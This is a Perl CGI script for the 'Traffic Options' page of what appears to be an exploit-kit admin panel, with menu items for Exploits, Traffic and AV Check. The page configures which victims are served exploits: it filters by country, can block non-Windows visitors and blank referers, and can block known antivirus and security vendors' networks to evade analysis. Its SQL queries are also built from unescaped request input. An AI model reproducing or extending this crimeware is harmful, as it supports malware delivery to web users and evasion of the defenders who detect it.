#!/usr/bin/perl
  
  # xplindex.pl
  use CGI;
  use CGI::Carp qw/fatalsToBrowser warningsToBrowser/;
  use CGI::Session ( '-ip_match' );
  use File::Basename;
  use DBI;
  require "xpl/config.pl";
 
  $db_name = 'DBI:mysql:' . $config{MysqlDB};
  $dbh = DBI->connect($db_name, $config{MysqlUser}, $config{MysqlPass}) || die "Could not connect to database: $DBI::errstr";
 
  $session = CGI::Session->load();
  $q = new CGI;
  $selectuser = $q->param('selectuser');
  $cook = $q->param('cook');
  $vfy = $q->param('vfy');
  $chgcity = $q->param('chgcity');
  $citygetted = $q->param('thecityraw');
  
  $selectuser = 'Admin' if($selectuser eq "");
  
  if($vfy ne 'xplad')
  {
    print "Status: 301 Moved\nLocation: login.pl\n\n";
  }  
  if($session->is_expired)
  {
      print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
      print "Your has session expired. Please login again.";
      print "<br/><a href='login.pl>Login</a>";
  }
  elsif($session->is_empty)
  {
      #print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
      print "Status: 301 Moved\nLocation: login.pl\n\n";
  }
  else
  {
    if($chgcity eq 'yes')
    {
      $citygetted =~ tr/[a-z]/[A-Z]/;
      $citygetted =~ s/\r/,/g;
      $citygetted =~ s/\n//g;

      $citygetted = 'ALL' if($citygetted !=~ ",");
      $blankcheckval = 'no';
      $windowsonlyval = 'no';
      $antivpval = 'no';

      $blankcheckval = 'yes' if(CGI::param("check_blank"));
      $windowsonlyval = 'yes' if(CGI::param("check_windows"));
      $antivpval = 'yes' if(CGI::param("check_antivp"));
     
      #Insert the changed options
      $sql = "UPDATE affiliates SET city='$citygetted', blankcheck='$blankcheckval', windowsonly='$windowsonlyval', antivp='$antivpval' WHERE username='$selectuser'"; #insert good cities
      $statement = $dbh->prepare($sql);
      $statement->execute(); #or print "$DBI::errstr";
    }
 
    #show users to add
    $userchoice = '<form method="post">' . "\n";
    $userchoice .= '<SELECT name="selectuser" ONCHANGE="location = this.options[this.selectedIndex].value;">' . "\n";

    #Select the Users from DB
    $req = "SELECT username FROM affiliates";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $userchoiceuser = $row['0'];
      if($selectuser eq $userchoiceuser)
      {
	$userchoice .= '<option selected="yes" value="xpltraffic.pl?vfy=xplad&cook=' . $cook . '&selectuser=' . $userchoiceuser . '">' . $userchoiceuser . '</option>' . "\n";
      }
      else
      {
	$userchoice .= '<option value="xpltraffic.pl?vfy=xplad&cook=' . $cook . '&selectuser=' . $userchoiceuser . '">' . $userchoiceuser . '</option>' . "\n";
      }

    }
    $sth -> finish;

    $userchoice .= '</SELECT>' . "\n";
    $userchoice .= "<input type=\"hidden\" name=\"cook\" value=\"$cook\">\n";
    $userchoice .= "<input type=\"hidden\" name=\"vfy\" value=\"xplad\">\n";
    $userchoice .= "</form>\n";

    #set the hidden value into the form
    $hiddenvalue .= "";
    $hiddenvalue .= "<input type=\"hidden\" name=\"cook\" value=\"$cook\">\n";
    $hiddenvalue .= "<input type=\"hidden\" name=\"selectuser\" value=\"$selectuser\">\n";
    $hiddenvalue .= "<input type=\"hidden\" name=\"stats\" value=\"$stats\">\n";
    $hiddenvalue .= "<input type=\"hidden\" name=\"vfy\" value=\"xplad\">\n";
    $hiddenvalue .= "<input type=\"hidden\" name=\"chgcity\" value=\"yes\">\n";

    #Check the mode currently enabled
    $req = "SELECT city,blankcheck,windowsonly,antivp FROM affiliates WHERE username='$selectuser'";
    $sth = $dbh->prepare($req);
    $sth->execute() || die;
    while(my @row = $sth->fetchrow_array)
    {
      $rawcountries = $row['0'];
      $rawblankcheck = $row['1'];
      $rawwindowscheck = $row['2'];
      $rawantivpcheck = $row['3'];

      $chkchkblank = 'checked="yes"' if($rawblankcheck =~ "yes");
      $chkchkwindows = 'checked="yes"' if($rawwindowscheck =~ "yes");
      $chkchkantivp = 'checked="yes"' if($rawantivpcheck =~ "yes");
    }

    $rawcountries =~ s/,/\n/g;

    print $q->header(-cache_control=>"no-cache, no-store, must-revalidate");
    indexalltab();
  }
  
sub indexalltab
{
 print <<THEHTMLINDEX;
 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML xmlns="http://www.w3.org/1999/xhtml" lang="fr"><HEAD><META http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">

<TITLE>$config{NetName} - Admin Panel</TITLE>
    <LINK rel="stylesheet" type="text/css" href="style/style3.css" media="all">
    

<script type="text/javascript">
			function showBox(text, obj, e) {
					obj.onmouseout = hideBox;
					node = document.createElement('div');
					node.style.left = e.layerX + 'px';
					node.style.top = e.layerY + 'px';
					node.id = 'popBox';
					node.innerHTML = text;
					obj.appendChild(node);
			}
function moveBox(e) {
	node = document.getElementById('popBox');
	node.style.left = e.layerX + 'px';
	node.style.top = e.layerY + 'px';
}
function hideBox() {
	node = document.getElementById('popBox');
	node.parentNode.removeChild(node);
}
</script>
<style type="text/css">
        div.nobr {
                 display: inline;
        }
	#popBox {
		position: absolute;
		z-index: 2;
		background: #cccccc;
		width: 200px;
		padding: 0.3em;
		border: 1px solid gray;
	}
	span {
		color: red;
		font-weight: bold;
	}
</style>

</HEAD><BODY>
<DIV id="top_nav">
	<DIV class="content">
	<center>
    
        <UL>
            <LI><A href="xplindex.pl?cook=$cook&vfy=xplad" title="Home" class="Home">Home</A></LI>
            <LI><A href="xplstats.pl?cook=$cook&vfy=xplad" title="Reports">Reports</A></LI>
            <LI><A href="xplprograms.pl?cook=$cook&selectuser=Admin&vfy=xplad" title="Accounts">Accounts</A></LI>
	    <LI><A href="xploptions.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Exploits Options">Exploits</A></LI>
	    <LI><A href="xpltraffic.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="Traffic Options">Traffic</A></LI>
            <LI><A href="xplavs.pl?cook=$cook&selectuser=$selectuser&vfy=xplad" title="AVs Check">AV Check</A></LI>
            <LI><A href="login.pl?action=logout" title="Log Out">Log Out</A></LI>
        </UL>
    </center>    
    </DIV>
</DIV>
<center>
<br>
<b>
</b>
<h2>[ Traffic Options ]</h2>
<br>
<center>
$userchoice
</center><br>
<DIV id="main">
<DIV class="content">
<DIV id="pages">
<DIV id="home">
<DIV>
</DIV>

<h3>Countries</h3><br>
Enter country code you want to use (one per line)<br>
Enter "ALL" without the quotes to accept all<br>
Enter "NONE" without the quotes to reject all<br>
<form method="post">
<textarea name="thecityraw" cols="40" rows="5">
$rawcountries
</textarea><br><br>
<h3>Traffic Block</h3><br>
Block blank Referer: <input type="checkbox" $chkchkblank value="option" name="check_blank"><br>
Block non Windows OS: <input type="checkbox" $chkchkwindows value="option1" name="check_windows"><br>
Block <div class="nobr" onmouseover="showBox('<b>Anti-Virus blocked:</b><br>Google Organisation<br>Trend Micro<br>Kaspersky<br>Avast<br>Av Test Organisation<br>Eset Nod32<br>SonicWall<br>Microsoft Organisation<br>VNET s. r. o.<br>Kindsight<br>The Planet<br>Level 3 Communications', this, event)">known Anti-Virus</div>: <input type="checkbox" $chkchkantivp value="option1" name="check_antivp"><br>


$hiddenvalue
<input type="submit" value="Submit" />
</form>

<br><br>
</DIV>
</DIV>
</DIV>

</DIV>
<br><br>
</center>

<DIV id="footer">
	<DIV class="content">
        <DIV class="copyright">
        	<P><BR>
        </DIV>        
    </DIV>
</DIV>

</body>
</html>
 
 
THEHTMLINDEX
}

1;
